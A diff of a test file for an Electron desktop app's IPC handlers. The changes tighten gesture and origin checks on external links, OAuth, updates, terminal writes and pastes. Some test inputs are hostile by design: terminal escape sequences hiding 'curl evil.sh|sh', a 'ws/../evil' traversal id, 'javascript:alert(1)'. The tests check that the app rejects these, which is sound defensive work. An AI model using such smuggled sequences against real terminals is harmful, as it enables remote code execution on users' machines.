@@ -1,5 +1,6 @@
 import { readFileSync } from 'node:fs'
 import { fileURLToPath } from 'node:url'
+import { PASTE_LIMITS } from '@sim/utils/paste'
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 
 vi.mock('electron', () => import('@/test/electron-mock'))
@@ -130,7 +131,7 @@ import {
 } from '@/main/browser-import'
 import { getSearchSuggestions } from '@/main/browser-search/suggestions'
 import { trackInputActivity } from '@/main/input-activity'
-import { type IpcDeps, registerIpcHandlers } from '@/main/ipc'
+import { type IpcDeps, openMicrophoneSettings, registerIpcHandlers } from '@/main/ipc'
 import { LocalFilesystemService } from '@/main/local-filesystem'
 import { TerminalRegistry } from '@/main/terminal/registry'
 import { findCachedTerminalThemeProfile, listTerminalThemeProfiles } from '@/main/terminal-themes'
@@ -234,6 +235,10 @@ const inactiveAppEvent = {
   sender: rejectedSender(),
 }
 const evilEvent = { senderFrame: { url: 'https://evil.example/page' }, sender: evilSender }
+const arbitraryFileEvent = {
+  senderFrame: { url: 'file:///Users/example/private.html' },
+  sender: fileSender,
+}
 /** The chooser anchors a native menu, so it needs a sender with a window. */
 const FAKE_WINDOW = { id: 'main-window' }
 const activeChooserEvent = {
@@ -273,6 +278,8 @@ describe('registerIpcHandlers', () => {
     deps = {
       appOrigin: () => APP,
       allowHttpLocalhost: () => false,
+      accountDataAvailable: () => true,
+      localPagePaths: ['/app/static/offline.html', '/app/static/server.html'],
       retryLoad: vi.fn(),
       beginOAuthConnect: vi.fn(async () => true),
       localFilesystem: new LocalFilesystemService({
@@ -316,6 +323,11 @@ describe('registerIpcHandlers', () => {
         check: vi.fn(),
         install: vi.fn(),
       },
+      server: {
+        open: vi.fn(),
+        getConfiguration: vi.fn(() => ({ origin: APP, defaultOrigin: APP, isSimCloud: true })),
+        setOrigin: vi.fn(async () => ({ ok: true as const, origin: APP, unchanged: true })),
+      },
     }
     registerIpcHandlers(deps)
   })
@@ -324,12 +336,40 @@ describe('registerIpcHandlers', () => {
     vi.useRealTimers()
   })
 
-  it('validates open-external URLs regardless of sender', async () => {
+  it('opens validated external URLs only after recent user input', async () => {
     const { invoke } = collectHandlers()
-    expect(await invoke.get('desktop:open-external')?.(evilEvent, 'https://docs.sim.ai')).toBe(true)
-    expect(await invoke.get('desktop:open-external')?.(appEvent, 'javascript:alert(1)')).toBe(false)
-    expect(await invoke.get('desktop:open-external')?.(appEvent, 42)).toBe(false)
+    const handler = invoke.get('desktop:open-external')
+    const activeUntrustedEvent = {
+      senderFrame: evilEvent.senderFrame,
+      sender: activeSender.sender,
+    }
+
+    expect(await handler?.(evilEvent, 'https://docs.sim.ai')).toBe(false)
+    expect(await handler?.(activeUntrustedEvent, 'https://docs.sim.ai')).toBe(true)
+    expect(await handler?.(activeAppEvent, 'javascript:alert(1)')).toBe(false)
+    expect(await handler?.(activeAppEvent, 42)).toBe(false)
     expect(shell.openExternal).toHaveBeenCalledTimes(1)
+  })
+
+  it('opens microphone privacy settings only for an activated trusted app origin', async () => {
+    const { invoke } = collectHandlers()
+    const handler = invoke.get('desktop:open-microphone-settings')
+
+    expect(await handler?.(evilEvent)).toBe(false)
+    expect(await handler?.(appEvent)).toBe(false)
+    expect(await handler?.(activeAppEvent)).toBe(process.platform === 'darwin')
+    expect(shell.openExternal).toHaveBeenCalledTimes(process.platform === 'darwin' ? 1 : 0)
+  })
+
+  it('uses fixed native microphone settings URLs', async () => {
+    await expect(openMicrophoneSettings('darwin')).resolves.toBe(true)
+    expect(shell.openExternal).toHaveBeenLastCalledWith(
+      'x-apple.systempreferences:com.apple.preference.security?Privacy_Microphone'
+    )
+
+    await expect(openMicrophoneSettings('win32')).resolves.toBe(true)
+    expect(shell.openExternal).toHaveBeenLastCalledWith('ms-settings:privacy-microphone')
+    await expect(openMicrophoneSettings('linux')).resolves.toBe(false)
   })
 
   it('keeps live search suggestions behind the app origin and privacy preference', async () => {
@@ -348,20 +388,21 @@ describe('registerIpcHandlers', () => {
     expect(await handler?.(appEvent, 'sim ai')).toEqual([])
   })
 
-  it('restricts the OAuth connect handoff to the app origin', async () => {
+  it('restricts the OAuth connect handoff to an activated app origin', async () => {
     const { invoke } = collectHandlers()
     const handler = invoke.get('desktop:oauth-connect')
     expect(await handler?.(evilEvent, 'slack')).toBe(false)
     expect(await handler?.(fileEvent, 'slack')).toBe(false)
+    expect(await handler?.(appEvent, 'slack')).toBe(false)
     expect(deps.beginOAuthConnect).not.toHaveBeenCalled()
-    expect(await handler?.(appEvent, 42)).toBe(false)
-    expect(await handler?.(appEvent, 'slack')).toBe(true)
+    expect(await handler?.(activeAppEvent, 42)).toBe(false)
+    expect(await handler?.(activeAppEvent, 'slack')).toBe(true)
     expect(deps.beginOAuthConnect).toHaveBeenCalledWith('slack', {})
 
     // Connects carry workspace/credential or exact-draft scope; malformed
     // scopes (wrong types, unsafe ids) are rejected before the handoff.
     expect(
-      await handler?.(appEvent, 'slack', {
+      await handler?.(activeAppEvent, 'slack', {
         workspaceId: 'ws1',
         credentialId: 'cred_1',
         draftId: 'draft_1',
@@ -374,13 +415,13 @@ describe('registerIpcHandlers', () => {
       draftId: 'draft_1',
       chatAttemptId: 'attempt_1',
     })
-    expect(await handler?.(appEvent, 'slack', { workspaceId: 'ws/../evil' })).toBe(false)
-    expect(await handler?.(appEvent, 'slack', { draftId: '../wrong' })).toBe(false)
-    expect(await handler?.(appEvent, 'slack', { chatAttemptId: '../wrong' })).toBe(false)
-    expect(await handler?.(appEvent, 'slack', 'not-an-object')).toBe(false)
+    expect(await handler?.(activeAppEvent, 'slack', { workspaceId: 'ws/../evil' })).toBe(false)
+    expect(await handler?.(activeAppEvent, 'slack', { draftId: '../wrong' })).toBe(false)
+    expect(await handler?.(activeAppEvent, 'slack', { chatAttemptId: '../wrong' })).toBe(false)
+    expect(await handler?.(activeAppEvent, 'slack', 'not-an-object')).toBe(false)
   })
 
-  it('restricts the updates surface to the app origin', async () => {
+  it('restricts updates to an activated app origin', async () => {
     const { invoke, on } = collectHandlers()
     const getState = invoke.get('desktop:updates:get-state')
     expect(await getState?.(evilEvent)).toEqual({ status: 'idle' })
@@ -393,6 +434,11 @@ describe('registerIpcHandlers', () => {
 
     on.get('desktop:updates:check')?.(appEvent)
     on.get('desktop:updates:install')?.(appEvent)
+    expect(deps.updates.check).not.toHaveBeenCalled()
+    expect(deps.updates.install).not.toHaveBeenCalled()
+
+    on.get('desktop:updates:check')?.(activeAppEvent)
+    on.get('desktop:updates:install')?.(activeAppEvent)
     expect(deps.updates.check).toHaveBeenCalledTimes(1)
     expect(deps.updates.install).toHaveBeenCalledTimes(1)
   })
@@ -405,6 +451,26 @@ describe('registerIpcHandlers', () => {
     expect(
       await invoke.get('desktop:local-filesystem')?.(appEvent, { operation: 'list_mounts' })
     ).toEqual({ ok: true, data: { mounts: [] } })
+  })
+
+  it('gates account-bearing browser, terminal, and filesystem APIs during recovery', async () => {
+    deps.accountDataAvailable = () => false
+    const { invoke } = collectHandlers()
+    const localFilesystemHandle = vi.spyOn(deps.localFilesystem, 'handle')
+    const terminalStart = vi.spyOn(deps.terminal, 'start')
+
+    await expect(
+      invoke.get('desktop:local-filesystem')?.(appEvent, { operation: 'list_mounts' })
+    ).resolves.toMatchObject({ ok: false, code: 'ACCESS_DENIED' })
+    await expect(invoke.get('browser-credentials:list')?.(appEvent)).resolves.toEqual([])
+    await expect(invoke.get('terminal:start')?.(appEvent, {}, 'chat-a')).resolves.toMatchObject({
+      ok: false,
+      code: 'ACCESS_DENIED',
+    })
+
+    expect(localFilesystemHandle).not.toHaveBeenCalled()
+    expect(listCredentials).not.toHaveBeenCalled()
+    expect(terminalStart).not.toHaveBeenCalled()
   })
 
   it('requires an active user gesture for granting or revoking folder access', async () => {
@@ -497,6 +563,11 @@ describe('registerIpcHandlers', () => {
 
     await set?.(appEvent, 'notificationsEnabled', false)
     expect(deps.settings.setPreference).toHaveBeenCalledWith('notificationsEnabled', false)
+
+    await set?.(appEvent, 'launchAtLogin', true)
+    expect(deps.settings.setPreference).not.toHaveBeenCalledWith('launchAtLogin', true)
+    await set?.(activeAppEvent, 'launchAtLogin', true)
+    expect(deps.settings.setPreference).toHaveBeenCalledWith('launchAtLogin', true)
 
     await setAppearance?.(evilEvent, 'browserTheme', 'dark')
     await setAppearance?.(appEvent, 'not-a-setting', 'dark')
@@ -598,6 +669,8 @@ describe('registerIpcHandlers', () => {
 
     on.get('offline:retry')?.(appEvent)
     expect(deps.retryLoad).not.toHaveBeenCalled()
+    on.get('offline:retry')?.(arbitraryFileEvent)
+    expect(deps.retryLoad).not.toHaveBeenCalled()
     on.get('offline:retry')?.(fileEvent)
     expect(deps.retryLoad).toHaveBeenCalledWith(fileSender)
   })
@@ -658,7 +731,7 @@ describe('registerIpcHandlers', () => {
     expect(await handler?.(fileEvent, 'tool-1', 'browser_navigate', {})).toMatchObject({
       ok: false,
     })
-    expect(await handler?.(appEvent, 'tool-1', 'browser_snapshot', {})).toMatchObject({
+    expect(await handler?.(appEvent, 'tool-1', 'browser_snapshot', {}, 'chat-1')).toMatchObject({
       ok: false,
       error: expect.stringContaining('authorized pending Copilot tool call'),
     })
@@ -672,9 +745,15 @@ describe('registerIpcHandlers', () => {
     }
     // The server-persisted name must match the renderer's requested name.
     expect(
-      await handler?.(authorizedEvent, 'tool-1', 'browser_navigate', {
-        url: 'https://evil.example',
-      })
+      await handler?.(
+        authorizedEvent,
+        'tool-1',
+        'browser_navigate',
+        {
+          url: 'https://evil.example',
+        },
+        'chat-1'
+      )
     ).toMatchObject({
       ok: false,
       error: expect.stringContaining('authorized pending Copilot tool call'),
@@ -682,9 +761,15 @@ describe('registerIpcHandlers', () => {
     // An authorized call reaches the driver with the server-persisted args
     // (which reports its own tool-level failure because no session exists).
     expect(
-      await handler?.(authorizedEvent, 'tool-1', 'browser_snapshot', {
-        ignored: 'renderer cannot choose params',
-      })
+      await handler?.(
+        authorizedEvent,
+        'tool-1',
+        'browser_snapshot',
+        {
+          ignored: 'renderer cannot choose params',
+        },
+        'chat-1'
+      )
     ).toMatchObject({
       ok: false,
       error: expect.stringContaining('No page is open yet'),
@@ -712,6 +797,28 @@ describe('registerIpcHandlers', () => {
     expect(cancelActive).toHaveBeenCalledTimes(1)
     cancel.mockRestore()
     cancelActive.mockRestore()
+  })
+
+  it('rejects a browser tool when the renderer claims a different scope than authorization', async () => {
+    const { invoke } = collectHandlers()
+    const handler = invoke.get('browser-agent:execute-tool')
+    const authorizedEvent = {
+      senderFrame: { url: `${APP}/workspace/ws1` },
+      sender: {
+        session: {
+          fetch: vi.fn(async () =>
+            Response.json({ chatId: 'chat-1', toolName: 'browser_snapshot', args: {} })
+          ),
+        },
+      },
+    }
+
+    expect(
+      await handler?.(authorizedEvent, 'tool-1', 'browser_snapshot', {}, 'forged-chat')
+    ).toMatchObject({
+      ok: false,
+      error: expect.stringContaining('authorized pending Copilot tool call'),
+    })
   })
 
   it('rejects a browser tool authorized after its scope cancellation boundary', async () => {
@@ -779,6 +886,43 @@ describe('registerIpcHandlers', () => {
     ).resolves.toEqual({ ok: true })
 
     expect(executeTool).toHaveBeenCalledWith('chat-a', 'tool-1', 'list', {})
+  })
+
+  it('requires trusted input to grant browser media while allowing denial without it', async () => {
+    const { invoke, on } = collectHandlers()
+    const panelAction = vi.spyOn(browserDriver, 'handlePanelAction').mockResolvedValue()
+    const handler = on.get('browser-agent:panel-action')
+
+    await invoke.get('browser-agent:activate-scope')?.(inactiveAppEvent, 'chat-media')
+    handler?.(
+      inactiveAppEvent,
+      { action: 'respond-media-permission', requestId: 'request-1', allowed: true },
+      'chat-media'
+    )
+    handler?.(
+      inactiveAppEvent,
+      { action: 'respond-media-permission', requestId: 'request-1', allowed: false },
+      'chat-media'
+    )
+
+    expect(panelAction).toHaveBeenCalledOnce()
+    expect(panelAction).toHaveBeenCalledWith('chat-media', {
+      action: 'respond-media-permission',
+      requestId: 'request-1',
+      allowed: false,
+    })
+
+    await invoke.get('browser-agent:activate-scope')?.(activeAppEvent, 'chat-media')
+    handler?.(
+      activeAppEvent,
+      { action: 'respond-media-permission', requestId: 'request-2', allowed: true },
+      'chat-media'
+    )
+    expect(panelAction).toHaveBeenLastCalledWith('chat-media', {
+      action: 'respond-media-permission',
+      requestId: 'request-2',
+      allowed: true,
+    })
   })
 
   it('ignores browser-agent panel actions from outside the app origin', () => {
@@ -1502,14 +1646,11 @@ describe('registerIpcHandlers', () => {
     expect(forgetCredential).toHaveBeenCalledWith('c1')
   })
 
-  it('always forwards the replies the PTY solicits', () => {
+  it('forwards fixed PTY device and focus reports without a gesture', () => {
     const { on } = collectHandlers()
     const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
 
-    // The PTY asks for these and the terminal must answer with no user input:
-    // DSR cursor position, device attributes, a focus report (mode 1004, set by
-    // tmux and vim), an SGR mouse report. Gating them would hang whatever asked.
-    const replies = ['\u001b[24;80R', '\u001b[?62;c', '\u001b[I', '\u001b[<0;10;5M']
+    const replies = ['\u001b[24;80R', '\u001b[?62;c', '\u001b[I', '\u001b[O']
     for (const reply of replies) {
       on.get('terminal:write')?.(inactiveAppEvent, 't1', reply, 'chat-a')
       expect(write).toHaveBeenCalledWith('chat-a', 't1', reply)
@@ -1522,11 +1663,11 @@ describe('registerIpcHandlers', () => {
     const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
 
     await invoke.get('terminal:activate-scope')?.(appEvent, 'chat-b')
-    on.get('terminal:write')?.(appEvent, 't1', '\u001b[I', 'chat-a')
-    expect(write).toHaveBeenCalledWith('chat-a', 't1', '\u001b[I')
+    on.get('terminal:write')?.(appEvent, 't1', '\u001b[24;80R', 'chat-a')
+    expect(write).toHaveBeenCalledWith('chat-a', 't1', '\u001b[24;80R')
 
-    on.get('terminal:write')?.(appEvent, 't1', '\u001b[I', 'chat-b')
-    expect(write).toHaveBeenCalledWith('chat-b', 't1', '\u001b[I')
+    on.get('terminal:write')?.(appEvent, 't1', '\u001b[24;80R', 'chat-b')
+    expect(write).toHaveBeenCalledWith('chat-b', 't1', '\u001b[24;80R')
   })
 
   it('clears retained terminal output only for an app-owned scope', async () => {
@@ -1617,19 +1758,23 @@ describe('registerIpcHandlers', () => {
     expect(deps.scopeEvents.activateTerminal).toHaveBeenLastCalledWith(appSender, 'chat-retry')
   })
 
-  it('only disposes provisional terminal scopes from the app origin', async () => {
+  it('only disposes provisional terminal scopes owned by the calling renderer', async () => {
     const { invoke } = collectHandlers()
     const disposeScope = vi.spyOn(deps.terminal, 'disposeScope')
     const dispose = invoke.get('terminal:dispose-scope')
 
     expect(await dispose?.(evilEvent, 'pending:new')).toBe(false)
     expect(await dispose?.(appEvent, 'chat-durable')).toBe(false)
+    expect(await dispose?.(appEvent, 'pending:new')).toBe(false)
+
+    await invoke.get('terminal:activate-scope')?.(appEvent, 'pending:new')
     expect(await dispose?.(appEvent, 'pending:new')).toBe(true)
+    expect(await dispose?.(appEvent, 'pending:new')).toBe(false)
     expect(disposeScope).toHaveBeenCalledOnce()
     expect(disposeScope).toHaveBeenCalledWith('pending:new')
   })
 
-  it('suspends only durable terminal scopes from the app origin', async () => {
+  it('suspends only the durable terminal scope active in the calling renderer', async () => {
     const suspendScope = vi.spyOn(deps.terminal, 'suspendScope').mockReturnValue(true)
     const { invoke } = collectHandlers()
     const suspend = invoke.get('terminal:suspend-scope')
@@ -1637,6 +1782,9 @@ describe('registerIpcHandlers', () => {
     expect(await suspend?.(evilEvent, 'chat-durable')).toBe(false)
     expect(await suspend?.(appEvent, 'not valid!')).toBe(false)
     expect(await suspend?.(appEvent, 'pending:new')).toBe(false)
+    expect(await suspend?.(appEvent, 'chat-durable')).toBe(false)
+
+    await invoke.get('terminal:activate-scope')?.(appEvent, 'chat-durable')
     expect(await suspend?.(appEvent, 'chat-durable')).toBe(true)
     expect(suspendScope).toHaveBeenCalledOnce()
     expect(suspendScope).toHaveBeenCalledWith('chat-durable')
@@ -1647,19 +1795,48 @@ describe('registerIpcHandlers', () => {
     )
   })
 
+  it('closes terminal tabs only after a gesture from their active visible renderer', async () => {
+    const state = { tabs: [], activeTerminalId: null }
+    const close = vi.spyOn(deps.terminal, 'closeUserTerminal').mockReturnValue(state)
+    const { invoke } = collectHandlers()
+    const closeTerminal = invoke.get('terminal:close')
+
+    await invoke.get('terminal:activate-scope')?.(inactiveAppEvent, 'chat-a')
+    await expect(closeTerminal?.(inactiveAppEvent, 't1', 'chat-a')).resolves.toEqual(state)
+    expect(close).not.toHaveBeenCalled()
+
+    await invoke.get('terminal:activate-scope')?.(activeAppEvent, 'chat-a')
+    await expect(closeTerminal?.(activeAppEvent, 't1', 'chat-a')).resolves.toEqual({
+      ...state,
+      scopeId: 'chat-a',
+    })
+    expect(close).toHaveBeenCalledWith('chat-a', 't1', activeSender.sender)
+
+    close.mockClear()
+    await invoke.get('terminal:activate-scope')?.(activeAppEvent, 'chat-b')
+    await closeTerminal?.(activeAppEvent, 't1', 'chat-a')
+    expect(close).not.toHaveBeenCalled()
+  })
+
+  it('does not expose renderer-wide terminal teardown', () => {
+    const { on } = collectHandlers()
+
+    expect(on.has('terminal:dispose')).toBe(false)
+  })
+
   it('pastes the clipboard from main rather than taking bytes from the caller', async () => {
     const { invoke } = collectHandlers()
-    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
+    const write = vi.spyOn(deps.terminal, 'writeUserInput').mockReturnValue(true)
     vi.mocked(clipboard.readText).mockReturnValue('echo hi')
 
     await expect(invoke.get('terminal:paste')?.(activeAppEvent, 't1', 'chat-a')).resolves.toBe(true)
 
-    expect(write).toHaveBeenCalledWith('chat-a', 't1', 'echo hi')
+    expect(write).toHaveBeenCalledWith('chat-a', 't1', 'echo hi', activeSender.sender)
   })
 
   it('refuses a paste with no gesture behind it, and reports an empty clipboard', async () => {
     const { invoke } = collectHandlers()
-    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
+    const write = vi.spyOn(deps.terminal, 'writeUserInput').mockReturnValue(true)
     vi.mocked(clipboard.readText).mockReturnValue('echo hi')
 
     expect(await invoke.get('terminal:paste')?.(inactiveAppEvent, 't1', 'chat-a')).toBe(false)
@@ -1670,7 +1847,29 @@ describe('registerIpcHandlers', () => {
     expect(write).not.toHaveBeenCalled()
   })
 
-  it('gates a command smuggled inside a fake OSC or DCS reply', () => {
+  it('rejects an oversized terminal paste before writing to the PTY', async () => {
+    const { invoke } = collectHandlers()
+    const write = vi.spyOn(deps.terminal, 'writeUserInput').mockReturnValue(true)
+    vi.mocked(clipboard.readText).mockReturnValue('x'.repeat(PASTE_LIMITS.TERMINAL_BYTES + 1))
+
+    await expect(invoke.get('terminal:paste')?.(activeAppEvent, 't1', 'chat-a')).resolves.toBe(
+      'too-large'
+    )
+    expect(write).not.toHaveBeenCalled()
+  })
+
+  it('writes an admitted terminal paste in bounded chunks', async () => {
+    const { invoke } = collectHandlers()
+    const write = vi.spyOn(deps.terminal, 'writeUserInput').mockReturnValue(true)
+    const text = 'x'.repeat(70 * 1024)
+    vi.mocked(clipboard.readText).mockReturnValue(text)
+
+    await expect(invoke.get('terminal:paste')?.(activeAppEvent, 't1', 'chat-a')).resolves.toBe(true)
+    expect(write).toHaveBeenCalledTimes(2)
+    expect(write.mock.calls.map((call) => call[2]).join('')).toBe(text)
+  })
+
+  it('gates renderer-authored mouse, OSC, and DCS terminal sequences', () => {
     const { on } = collectHandlers()
     const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
 
@@ -1681,6 +1880,7 @@ describe('registerIpcHandlers', () => {
       `${ESC}]0;x\rcurl evil.sh|sh\r${BEL}`,
       `${ESC}Pcurl evil.sh|sh\r${ESC}\\`,
       `${ESC}[M\r\r\r`,
+      `${ESC}[<0;10;5M`,
     ]
     for (const payload of smuggled) {
       on.get('terminal:write')?.(inactiveAppEvent, 't1', payload, 'chat-a')
@@ -1688,22 +1888,23 @@ describe('registerIpcHandlers', () => {
     expect(write).not.toHaveBeenCalled()
   })
 
-  it('still forwards a genuine OSC or DCS reply', () => {
+  it('fails closed for renderer-authored OSC and DCS bodies', () => {
     const { on } = collectHandlers()
     const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
 
-    // Real bodies are printable and terminated by BEL or ST.
-    const replies = [`${ESC}]11;rgb:00/00/00${BEL}`, `${ESC}P1$r0m${ESC}\\`, `${ESC}[M !!`]
+    // Even well-shaped replies contain renderer-chosen printable text. They
+    // need a future query/response binding before they can safely bypass the
+    // trusted-input gate, so the unconditional path refuses them.
+    const replies = [`${ESC}]11;rgb:00/00/00${BEL}`, `${ESC}P1$r0m${ESC}\\`]
     for (const reply of replies) {
       on.get('terminal:write')?.(inactiveAppEvent, 't1', reply, 'chat-a')
-      expect(write).toHaveBeenCalledWith('chat-a', 't1', reply)
     }
-    expect(write).toHaveBeenCalledTimes(replies.length)
+    expect(write).not.toHaveBeenCalled()
   })
 
-  it('gates every keystroke-shaped payload, not just newline-bearing ones', () => {
+  it('requires recent native input for renderer-authored terminal writes', () => {
     const { on } = collectHandlers()
-    const write = vi.spyOn(deps.terminal, 'write').mockImplementation(() => {})
+    const write = vi.spyOn(deps.terminal, 'writeUserInput').mockReturnValue(true)
 
     // Enumerating "what submits" would have missed these: EOT hands a partial
     // line to a canonical-mode reader, and 0x0f executes the current line in
@@ -1713,8 +1914,9 @@ describe('registerIpcHandlers', () => {
     }
     expect(write).not.toHaveBeenCalled()
 
-    on.get('terminal:write')?.(activeAppEvent, 't1', 'ls\r', 'chat-a')
-    expect(write).toHaveBeenCalledWith('chat-a', 't1', 'ls\r')
+    activeSender.press()
+    on.get('terminal:write')?.(activeAppEvent, 't1', 'l', 'chat-a')
+    expect(write).toHaveBeenCalledWith('chat-a', 't1', 'l', activeSender.sender)
   })
 
   it('defaults password conflicts to keeping what is already stored', async () => {
